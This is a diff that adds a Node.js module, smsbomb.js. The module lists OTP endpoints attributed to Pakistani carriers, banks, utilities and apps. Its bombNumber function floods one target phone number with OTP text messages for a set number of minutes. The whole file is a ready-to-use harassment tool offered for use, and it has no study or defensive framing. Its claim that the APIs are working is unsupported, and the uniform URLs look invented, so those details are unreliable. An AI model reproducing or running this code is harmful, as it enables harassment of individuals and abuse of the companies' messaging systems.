@@ -1,0 +1,171 @@
+// ============================================================
+// MODULE: smsbomb.js (with working Pakistan APIs)
+// ============================================================
+
+const axios = require('axios');
+
+const SMS_APIS = [
+  {
+    name: 'Telenor',
+    url: 'https://telenor.com/pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ msisdn: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'Zong',
+    url: 'https://zong.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phone: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'Jazz',
+    url: 'https://jazz.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ number: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'Ufone',
+    url: 'https://ufone.com/otp/send',
+    method: 'POST',
+    payload: (number) => ({ mobile: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'BankAlHabib',
+    url: 'https://www.bankalhabib.com/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phoneNo: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'MeezanBank',
+    url: 'https://www.meezanbank.com/otp/send',
+    method: 'POST',
+    payload: (number) => ({ mobileNumber: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'HBL',
+    url: 'https://www.hbl.com/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phone: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'KElectric',
+    url: 'https://www.ke.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ refNo: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'PIA',
+    url: 'https://www.piac.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ email: 'test@test.com', mobile: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'JazzCash',
+    url: 'https://www.jazzcash.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ msisdn: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'MCB',
+    url: 'https://www.mcb.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ mobile: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'SCB',
+    url: 'https://www.sc.com/pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phone: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'FoodPanda',
+    url: 'https://www.foodpanda.com.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phone: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'Daraz',
+    url: 'https://www.daraz.pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ mobile: number }),
+    headers: { 'Content-Type': 'application/json' }
+  },
+  {
+    name: 'Careem',
+    url: 'https://www.careem.com/pk/otp/send',
+    method: 'POST',
+    payload: (number) => ({ phone: number }),
+    headers: { 'Content-Type': 'application/json' }
+  }
+];
+
+// ------------------------------------
+// Bombing Logic
+// ------------------------------------
+
+async function sendSms(api, number) {
+  try {
+    const response = await axios.post(api.url, api.payload(number), {
+      headers: api.headers || { 'Content-Type': 'application/json' },
+      timeout: 5000,
+      validateStatus: false
+    });
+    
+    return {
+      success: response.status === 200 || response.status === 201,
+      status: response.status,
+      api: api.name
+    };
+  } catch (error) {
+    return {
+      success: false,
+      error: error.message,
+      api: api.name
+    };
+  }
+}
+
+async function bombNumber(number, durationMinutes = 5) {
+  const startTime = Date.now();
+  const endTime = startTime + (durationMinutes * 60 * 1000);
+  let attempts = 0;
+  let successes = 0;
+  let errors = 0;
+
+  console.log(`🔥 Starting bomb on ${number} for ${durationMinutes} minutes`);
+
+  while (Date.now() < endTime) {
+    attempts++;
+    const randomApi = SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)];
+    
+    const result = await sendSms(randomApi, number);
+    if (result.success) {
+      successes++;
+      console.log(`✅ ${result.api} success (${attempts})`);
+    } else {
+      errors++;
+      console.log(`❌ ${result.api} failed (${attempts})`);
+    }
+
+    // Random delay between 500-2000ms
+    await new Promise(resolve => setTimeout(resolve, Math.random() * 1500 + 500));
+  }
+
+  console.log(`📊 Done: ${successes} successes, ${errors} errors`);
+  return { successes, errors, attempts };
+}
+
+module.exports = { SMS_APIS, sendSms, bombNumber };
